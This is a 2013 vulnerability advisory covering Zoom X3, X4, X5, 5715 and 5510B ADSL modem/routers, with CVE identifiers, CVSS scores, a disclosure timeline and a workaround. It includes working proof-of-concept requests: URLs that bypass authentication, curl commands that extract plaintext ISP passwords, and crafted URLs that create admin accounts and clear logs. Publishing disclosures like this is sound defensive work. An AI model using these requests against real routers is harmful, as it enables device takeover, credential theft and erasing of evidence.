@@ -1,0 +1,159 @@
+Five models of the Zoom Telephonics ADSL Modem/Router line suffer from
+multiple critical vulnerabilities, almost all being of a remote access
+attack vector.
+
+Models affected:
+Zoom X3 ADSL Modem/Router
+Zoom X4 ADSL Modem/Router
+Zoom X5 ADSL Modem/Router
+Zoom ADSL Bridge Modem Model 5715 (1 vulnerability)
+Zoom USB ADSL Modem Model 5510B (1 vulnerability)
+
+
+Timeline:
+The vendor has not responded to our inquires concerning these
+vulnerabilities. They were first reported on June 28th, 2013 and
+partial disclosure was made on July 9, 2013.
+
+----------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------
+
+Directory Traversal/Unauthenticated access to administrative panels
+
+CVSS Base Score 9.7
+Impact Subscore 9.5
+Temporal Score: 8.3
+(AV:N/AC:L/Au:N/C:P/I:C/A:C/E:F/RL:W/RC:UR/CDP:H/TD:H/CR:ND/IR:ND/AR:ND)
+CWE-22: Improper Limitation of a Pathname to a Restricted Directory
+
+CVE-2013-5622 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
+2.2.X 2.5.X 3.2
+CVE-2013-5627 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X 3.0.X
+CVE-2013-5624 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
+2.2.X 2.5.X 3.0.X
+
+
+By simply placing the following two URLs into a web browser, a
+vulnerability will all models and firmware versions allow for bypass
+of administrative credential challenge. All models and firmware
+versions can access these pages with no authentication. An
+un-authenticated user can preform almost all administrative tasks once
+the authentication is bypassed.
+
+http://<IP>/hag/pages/toc.htm (--Menu Banner)
+http://<IP>/hag/pages/toolbox.htm (-Advanced Options Menu)
+
+
+----------------------------------------------------------------------------------------------------------------
+
+
+Improper handling of unexpected characters/data
+
+CVSS Base Score 8.3
+Impact Subscore 8.5
+Temporal Score: 6.7
+(AV:N/AC:M/Au:N/C:P/I:P/A:C/E:POC/RL:W/RC:UR)
+CWE-241: Improper Handling of Unexpected Data Type
+
+CVE-2013-5623 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
+2.2.X 2.5.X 3.2
+CVE-2013-5628 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X 3.0.X
+CVE-2013-5631 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
+2.2.X 2.5.X 3.0.X
+CVE-2013-5632 - Zoom ADSL Bridge Modem Model 5715; all firmware versions
+CVE-2013-5633 - Zoom USB ADSL Modem Model 5510B; all firmware versions
+
+When an unexpected/illegal character is added to the end of any URL
+which calls a value, such as http://<IP>/MainPage?id=25' the browser
+will immediately redirect the browser to the "System Status" page
+without authentication, where links to each interface (i.e.
+eth-0,usb-0,etc) is both selectable whose properties can be edited.
+
+
+----------------------------------------------------------------------------------------------------------------
+
+Plain text storage of ISP/PPPoe usernames/passwords
+
+CVSS Base Score 6.8
+Impact Subscore 6.4
+Temporal Score: 8.6
+(AV:N/AC:M/Au:N/C:P/I:P/A:P/E:POC/RL:W/RC:UR)
+CWE-311: Missing Encryption of Sensitive Data
+
+CVE-2013-5620 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
+2.2.X 2.5.X 3.2
+CVE-2013-5626 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X 3.0.X
+CVE-2013-5629 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
+2.2.X 2.5.X 3.0.X
+
+The following command will display the ISP usernames and passwords.
+(The print value may vary slightly based on firmware.)
+
+Proof of Concept
+curl -s http://<IP>/MainPage?id=25 |egrep -i 'MacWanPasswd'|awk '{ print $8 }'
+   value="wanpasswd1" ('or similar')
+
+curl -s http://<IP>/MainPage?id=25 |egrep -i 'MacWanUsrName'|awk '{ print $21 }'
+   value="user@usersisp.net" ('or similar')
+
+
+----------------------------------------------------------------------------------------------------------------
+
+Unauthenticated direct execution of administrative tasks
+
+CVSS Base Score 10.0
+Impact Subscore 10.0
+Temporal Score: 8.6
+(AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:W/RC:UR/CDP:H/TD:H/CR:ND/IR:ND/AR:ND)
+CWE-285: Improper Authorization
+
+CVE-2013-5621 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X 2.2.X 2.5.X
+CVE-2013-5625 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X
+CVE-2013-5630 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X 2.2.X 2.5.X
+
+Administrative authentication can be bypassed and commands directly
+executed with specially crafted commands.
+
+Proofs of Concept -
+
+Create New Acct Admin or Intermediate - (all PW and admin names are
+'or similar')
+
+http://<IP>/hag/emweb/PopOutUserAdd.htm?id=70&user_id="newintermediateaccount"&priv=v2&pass1="123456"&pass2="123456"&cmdSubmit=Save+Changes
+
+
+Clear Logs
+
+http://<IP>/Action?id=76&cmdClear+Log=Clear+Log
+
+----------------------------------------------------------------------------------------------------------------
+
+Fixes/Patches:
+There are no known patches or fixes for these vulnerabilities at this time.
+
+
+Workaround:
+It is advised to turn off all remote administrative access to the
+router. This workaround however, will not prevent local attacks.
+
+----------------------------------------------------------------------------------------------------------------
+
+External Links
+http://www.osvdb.org/show/osvdb/95071
+http://xforce.iss.net/xforce/xfdb/85612
+http://www.idappcom.com/db/?7819
+
+
+Vendor Links
+http://www.zoomtel.com/products/5715.html
+http://www.zoomtel.com/graphics/datasheets/adsl/USB_3104_5510B.pdf
+http://www.zoomtel.com/products/adsl_overview.html
+http://www.zoomtel.com/products/5760.html
+http://www.zoomtel.com/products/5751.html
+http://www.zoomtel.com/products/5754.html
+
+
+Discovered - 06-28-2013
+Updated - 09/01/2013
+Research Contact - K Lovett
+Affiliation - QuattroSG
